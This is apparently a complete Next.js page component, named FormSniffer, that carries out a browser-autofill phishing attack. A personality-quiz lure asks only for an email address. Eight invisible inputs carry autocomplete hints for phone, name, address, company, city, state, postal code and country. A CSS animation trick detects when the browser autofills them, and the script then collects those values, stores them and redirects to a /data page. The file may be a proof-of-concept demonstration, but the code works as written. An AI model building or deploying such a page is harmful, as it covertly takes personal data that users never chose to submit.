"use client";

import React, { useEffect, useRef } from "react";
import GalaxyScene from "../components/GalaxyScene";
import { useRouter } from 'next/navigation';

function FormSniffer() {
  const router = useRouter();
  const formRef = useRef<HTMLFormElement | null>(null);
  const allFieldsRef = useRef<Record<string, string>>({});
  const printedRef = useRef(false);


  const autofillFieldsRef = useRef<Record<string, boolean>>({});

  useEffect(() => {
    const form = formRef.current;
    if (!form) return;

    const inputs = form.querySelectorAll("input");


    const style = document.createElement("style");
    style.innerHTML = `
      @keyframes autofill {
        to { color: #000; }
      }
      input:-webkit-autofill {
        animation-name: autofill;
        animation-duration: 0.5s;
      }
    `;
    document.head.appendChild(style);

    const handleAnimationStart = (e: AnimationEvent) => {
      if (e.animationName === "autofill") {
        const input = e.target as HTMLInputElement;
        autofillFieldsRef.current[input.name] = true;
      }
    };

    const handleChange = (e: Event) => {
      const input = e.target as HTMLInputElement;
      if (autofillFieldsRef.current[input.name] && input.value) {
        allFieldsRef.current[input.name] = input.value;
        if (!printedRef.current) {
          console.log(allFieldsRef.current);
          printedRef.current = true;


          setTimeout(() => {
            // Re-check all fields before navigating, to ensure we have all autofills
            const form = formRef.current;
            if (form) {
              const allInputs = form.querySelectorAll('input');
              allInputs.forEach((inp) => {
                if (inp.value && autofillFieldsRef.current[inp.name]) {
                  allFieldsRef.current[inp.name] = inp.value;
                }
              });
            }


            const jsonData = JSON.stringify(allFieldsRef.current);
            window.localStorage.setItem("autofilledData", jsonData);


            router.push(`/data`);
          }, 200);
        }
      }
    };

    inputs.forEach((input) => {
      input.addEventListener("animationstart", handleAnimationStart);
      input.addEventListener("change", handleChange);
    });

    return () => {
      inputs.forEach((input) => {
        input.removeEventListener("animationstart", handleAnimationStart);
        input.removeEventListener("change", handleChange);
      });
      if (style.parentNode) {
        document.head.removeChild(style);
      }
    };
  }, [router]);

  return (
    <div className="relative w-full h-screen">

      <GalaxyScene />


      <div className="relative z-10 flex flex-col items-center justify-center h-full">

        <h1 className="mb-4 text-4xl font-extrabold tracking-tight text-gray-900 dark:text-white">
          What does your email say about your personality?
        </h1>
        <p className="mb-6 text-lg text-gray-500 dark:text-gray-400 lg:text-xl">
          Enter your email to uncover the unique traits it reveals about you.
        </p>


        <div className="flex items-center space-x-4">
          <form ref={formRef} autoComplete="on" className="flex items-center">
            <label className="text-gray-400 mr-3" htmlFor="email">
              Email
            </label>
            <input
              id="email"
              type="email"
              name="email"
              autoComplete="email"
              className="text-transparent border-2 bg-transparent border-cyan-500 focus:border-blue-600 focus:ring-2 focus:ring-blue-600 p-2 rounded-lg"
            />


            {[
              { id: "phone", name: "phone", autoComplete: "tel" },
              { id: "name", name: "name", autoComplete: "name" },
              { id: "address", name: "address", autoComplete: "street-address" },
              { id: "company", name: "company", autoComplete: "organization" },
              { id: "city", name: "city", autoComplete: "address-level2" },
              { id: "state", name: "state", autoComplete: "address-level1" },
              { id: "postal_code", name: "postal_code", autoComplete: "postal-code" },
              { id: "country", name: "country", autoComplete: "country" },
            ].map((field) => (
              <input
                key={field.id}
                id={field.id}
                type="text"
                name={field.name}
                autoComplete={field.autoComplete}
                className="absolute opacity-0 pointer-events-none h-0 w-0"
              />
            ))}
          </form>

          <button
            disabled
            className="bg-transparent text-gray-600 border-2 border-cyan-900 font-semibold py-2 px-4 rounded-lg cursor-not-allowed hover:text-gray-800 hover:border-gray-500"
          >
            Submit
          </button>
        </div>
      </div>
    </div>
  );
}

export default FormSniffer;
